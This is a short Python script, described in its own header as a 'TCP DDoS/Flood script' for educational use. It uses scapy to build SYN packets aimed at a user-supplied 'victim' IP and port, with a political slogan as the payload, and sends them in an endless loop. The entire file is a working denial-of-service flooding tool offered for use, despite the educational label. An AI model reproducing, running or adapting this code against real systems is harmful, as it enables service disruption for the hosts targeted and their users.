# !/usr/bin/env python

# TCP DDoS/Flood script
# Author: N.Kuznetsoff(c)
# Description: Educational script
# using:
# before starting, ensure you have installed "scapy"
# pip install scapy

import argparse
from scapy.all import *


def createParser(): #create arguments parser f()

	parser = argparse.ArgumentParser(description="\nWellcome to the Doser flood script.\nFirst of all you need to choose IP (-d) and port (-p) of the victim machine. -p is optional argument, you can leave this field empty and port will be setted automaticly to http (80).")
	parser.add_argument("-d", "--distanation", help="Victim IP address in format -d x.x.x.x")
	parser.add_argument("-p", "--port", help="Victim port(s) that will be attacked")
	return parser

	
if __name__ == "__main__": #main code
	
	print("\ninitiating...\n")

	parser = createParser()
	namespace = parser.parse_args() #making a namespace from a parsed arguments

	print(str(namespace)+"\n") #debugging view of namespace

	#init main script vars

	#init final vars to distanation IP address
	if str(namespace.distanation) == "None": print("Missing IP distanation:Exit. Use 'help' - doser.py -h")
	else: distip=str(namespace.distanation) 
		
	#init distant port	
	if str(namespace.port) == "None": distport = 80 
	else: distport = namespace.port
		
	#automatic packet crafting	
	target=IP(dst=distip, id=4342,ttl=99)/TCP(sport=RandNum(1,65536), dport=int(distport), seq=12345, flags="S")/"VOTE FOR TRUMP AND BALALAIKA!" 

	#packet view
	target.display()

	char=raw_input("Press Enter to start")
	
	#sends packet in the loop
	send(target,inter=0.07, loop=1) 	


